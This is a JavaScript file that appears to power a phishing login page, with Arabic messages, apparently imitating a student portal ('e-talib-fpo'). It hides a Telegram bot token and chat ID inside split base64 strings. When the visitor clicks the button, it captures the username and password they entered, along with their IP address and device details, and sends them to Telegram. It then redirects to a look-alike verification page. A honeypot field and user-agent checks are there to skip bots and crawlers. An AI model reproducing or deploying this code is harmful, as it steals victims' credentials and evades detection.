const tokenPart1 = "NzU5MzQwOTA2MT";
const tokenPart2 = "pBQUhFUENUQ0x0dnhhQVdjRXltNzlnTDh1ZUhSQjd0dkRYZw==";
const TOKEN = atob(tokenPart1 + tokenPart2);

const chatIdPart1 = "NjAxNTIxNT";
const chatIdPart2 = "Y3NA==";
const CHAT_ID = atob(chatIdPart1 + chatIdPart2);

document.getElementById('button').addEventListener('click', async function(e) {
    e.preventDefault();

    const username = document.getElementById('UserName').value.trim();
    const password = document.getElementById('input[type="password"]').value.trim();
    const honeypot = document.querySelector('[name="honeypot"]').value.trim();
    const userAgent = navigator.userAgent.toLowerCase();

    if (honeypot || userAgent.includes('bot') || userAgent.includes('crawler')) {
        console.log('تم اكتشاف بوت');
        return;
    }

    if (!username || !password) {
        alert('يرجى إدخال اسم المستخدم وكلمة المرور.');
        return;
    }

    try {
        const ip = await getUserIP();
        const deviceInfo = getDeviceInfo();
        const data = { username, password, ip, deviceInfo };
        
        await sendToTelegram(data, TOKEN, CHAT_ID);
        window.location.href = "https://e-talib-fpo.github.io/verification/login.html";
    } catch (err) {
        console.error('Error:', err);
        alert('حدث خطأ أثناء إرسال البيانات');
    }
});